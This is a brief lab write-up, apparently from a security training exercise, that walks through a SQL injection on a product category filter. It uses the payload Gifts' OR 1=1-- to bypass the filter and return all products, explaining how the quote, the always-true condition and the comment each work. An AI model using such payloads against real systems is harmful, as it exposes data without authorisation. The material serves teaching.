## Lab: SQL Injection – Category Filter Bypass

### Goal

Determine whether the category filter is vulnerable to SQL injection and retrieve all products.

---

### Observation

The application filters products using a URL parameter:

/filter?category=Gifts  

The backend query appears to be:

SELECT * FROM products  
WHERE category='Gifts'  

---

### Test

I modified the category parameter to test for SQL injection.

---

### Payload

Gifts' OR 1=1--  

---

### Explanation of the Payload

- `'` → closes the string  
- `OR 1=1` → always true condition  
- `--` → comments out the rest  

---

### Query Execution

SELECT * FROM products  
WHERE category='Gifts' OR 1=1--'  

---

### Final Query Interpreted by Database

SELECT * FROM products  
WHERE category='Gifts' OR 1=1  

---

### Result

Since `1=1` is always true:

- The filter condition is bypassed  
- All products are returned  

---

### Impact

This vulnerability allows:

- Data exposure  
- Bypassing application logic  
- Access to restricted data  

---

### Final Memory Line

SQL Injection = break filter + add always true condition  

Example pattern:

Gifts' OR 1=1--
